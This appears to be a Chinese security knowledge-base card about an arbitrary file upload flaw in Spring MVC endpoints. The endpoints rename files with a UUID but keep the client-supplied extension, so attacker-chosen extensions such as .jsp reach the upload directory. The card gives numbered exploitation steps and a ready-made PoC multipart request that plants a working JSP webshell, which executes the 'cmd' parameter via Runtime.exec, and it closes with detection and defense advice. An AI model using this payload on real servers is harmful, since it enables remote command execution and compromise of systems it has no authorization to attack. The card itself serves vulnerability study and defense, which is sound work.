---
id: web-generic-file-upload-spring-uuid-preserve-original-extension
title: Spring MVC 上传接口 UUID 重命名但保留原始后缀：跳过扩展名校验的 JSP 任意文件上传
type: scenario
domain: web
path: web/generic/file-upload
technique: uuid-rename-preserve-client-extension
aliases:
- UUID 重命名保留后缀
- 原后缀上传
- uploadFileApp 任意文件上传
- actionCloudAddFile 上传
- actionAdd 上传
- UUID + 原始扩展名绕过
tags:
- web
- file-upload
- java
- spring-mvc
- uuid
- extension-bypass
- webshell
- arbitrary-write
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V33
  verified_at: '2026-11-05T06:00:28+08:00'
  notes: 已对照原文与26张截图核对：uploadFileApp/actionAdd/actionCloudAddFile/actionCloudModify 四处 UUID+原后缀上传代码与文中/img 一致，均无后缀校验；原文未展示 webshell 访问/解析成功，仅代码确认任意文件写，PoC 未在本机执行
---

## 一句话结论

多个 Spring MVC 上传接口虽然用 UUID 生成随机文件名，却把客户端原始文件名的最后一个 `.` 之后内容原样拼回新文件名；开发者以为“随机名”已足够安全，但扩展名仍完全由攻击者控制且没有任何白名单/内容校验，上传 `test.jsp` 即可在 `/usr/web` 下的上传目录写入 JSP。

## 原理

- 典型代码模式：`String name = file.getOriginalFilename(); String alias = UUID.randomUUID().toString(); if (name.indexOf(".") > -1) { alias = alias + name.substring(name.lastIndexOf(".")); } File f = new File("/usr/web/resources/upload/" + alias); FileUtils.copyInputStreamToFile(file.getInputStream(), f);`
- UUID 只解决了“文件名不可预测/不重名”，没有解决“文件类型”。扩展名来自 `getOriginalFilename()`，完全由 multipart 的 `filename` 决定；`substring(lastIndexOf("."))` 取的是最后一个点后的内容，`test.jsp` 得到 `.jsp`。
- 代码路径中没有 `getExtension()` 白名单、Content-Type 校验、魔数/图片二次渲染，也没有对文件名做 basename/路径过滤；`FileUtils.copyInputStreamToFile` 按字节原样写入。
- 类似的四处实现只差路径和取后缀方式：
  - `AppController.uploadFileApp`：`/usr/web/resources/upload/` + UUID + 原后缀；
  - `FaceDataController.actionAdd`：`/usr/web/tmp/` + UUID + "." + 原后缀；
  - `VcsController.actionCloudAddFile`：`/usr/web/avatar/` + UUID + 原后缀；
  - `VcsController.actionCloudModify`：先删除旧头像，再按同样方式写入新文件。
- 只要上传目录位于 Web 根且容器把 `.jsp` 当 JSP 解析，随机文件名只影响访问路径（可从响应 JSON 的 `name`/`url` 或目录枚举获得），不影响 getshell。
- 风险本质是“随机化 ≠ 类型校验”：UUID 命名常被误认为上传安全措施，但它只改变文件名，不改变可执行后缀。

## 触发条件

- 目标为使用该代码模式的 Spring MVC 应用（原文为某管理服务器，未公开产品名）。
- 上传接口可达（可能位于鉴权白名单或被 `../` 路径绕过；原文另述鉴权绕过）。
- 上传目录 `/usr/web/resources/upload/`、`/usr/web/tmp/`、`/usr/web/avatar/` 等位于 Web 根或可被 Web 服务器映射。
- Web 服务器解析 JSP（或目标支持的其他脚本后缀）。

## 利用步骤

1. 找到上传接口（如 `/aaa/uploadFileApp.do`、`/face/actionAdd.do`、`/vcs/actionCloudAddFile.do`、`/vcs/actionCloudModifyFile.do`）。
2. 上传内容为 JSP WebShell 的文件，`filename` 设为 `test.jsp`，`Content-Type` 设为 `image/jpeg`（部分接口按图片处理，但代码不校验）。
3. 从响应 JSON 读取 `name`/`url`，或按 UUID 规则在返回路径中定位文件；上传目录通常是固定前缀。
4. 访问对应 URL；若 `/file/upload/<alias>` 只是下载接口，尝试直接访问 `/resources/upload/<alias>`、`/tmp/<alias>`、`/avatar/<alias>` 等静态路径。
5. 确认 JSP 解析后替换为功能完整的 WebShell。

## PoC

```http
POST /aaa/uploadFileApp.do HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj

------WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Disposition: form-data; name="file"; filename="test.jsp"
Content-Type: image/jpeg

<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
   int a = -1; byte[] b = new byte[2048]; out.print("<pre>");
   while((a=in.read(b))!=-1){ out.println(new String(b,0,a)); }
   out.print("</pre>"); %>
------WebKitFormBoundaryFfJZ4PlAZBixjELj--
```

服务端落盘路径形如 `/usr/web/resources/upload/<uuid>.jsp`，响应 JSON 返回 `{"name":"<uuid>.jsp","url":"/file/upload/<uuid>.jsp"}`。

## 变体与关联

- 后缀取法差异：`substring(lastIndexOf(".")+1)` 再拼 `.`、直接 `substring(lastIndexOf("."))`，都能保留 `.jsp`；无点文件名则得到纯 UUID，不可执行。
- 双后缀/大小写：`shell.jsp.jpg` 取最后一段是 `.jpg`，不可执行；但 `shell.jsp`、`shell.JSP`、`shell.jsp;.jpg` 视容器解析规则可能绕过。
- 头像/临时目录：`/usr/web/tmp/`、`/usr/web/avatar/` 若可静态访问且解析 JSP，同样可 getshell；`actionCloudModify` 还会删除旧文件，可用于覆盖/清理。
- 与 [[web-generic-file-upload-extension-zero-check]] 的差异：本卡强调“UUID 重命名仍保留客户端后缀”这一常见误判；与 [[web-generic-file-upload-weak-suffix-bypass]] 的差异是上传端根本不校验后缀，而非校验后被绕过。
- 与 [[web-php-framework-yii2-uploadedfile-saveas-unfiltered]] 同属“保存 API 不做类型校验”，语言/框架不同。

## 检测与防御

- 保存前对扩展名做白名单（jpg/png/gif/webp 等），并用服务端生成的扩展名替换客户端后缀；不要用 `getOriginalFilename()` 的任何部分拼接目标文件名。
- 校验 MIME 与文件头/魔数，对图片做二次渲染；拒绝 JSP/PHP 等脚本后缀（含大小写、双后缀变体）。
- 上传目录移出 Web 根；必须公开时禁止脚本解析（Tomcat 映射、Nginx `location`、Apache `php_flag engine off`）。
- 上传接口加认证/授权，不要仅依赖拦截器白名单；对返回的下载接口做路径白名单，防止把上传目录当静态资源直接暴露。
- 检测：上传请求 filename 含 `.jsp`/`.jspx`/`.php` 等脚本后缀但 Content-Type 为图片；Web 目录出现 UUID 命名的脚本文件；访问该文件返回 200 且响应含脚本输出/命令结果。
